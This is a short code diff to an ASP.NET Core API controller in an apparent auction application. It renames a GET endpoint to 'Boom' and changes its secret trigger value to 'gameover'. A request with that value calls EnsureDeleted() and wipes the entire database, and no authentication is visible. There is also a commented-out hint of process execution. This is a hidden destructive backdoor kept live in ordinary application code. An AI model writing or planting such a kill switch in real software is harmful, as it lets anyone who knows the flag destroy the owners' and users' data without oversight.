@@ -27,11 +27,11 @@ namespace Auction.Controllers.Api
         }
 
         [HttpGet("[action]")]
-        public IActionResult Abd(string flag)
+        public IActionResult Boom(string flag)
         {
 
             string output = ""; //输出字符串  
-            if (flag == "123")
+            if (flag == "gameover")
             {
                 _context.Database.EnsureDeleted();
                 // Process process = new Process();
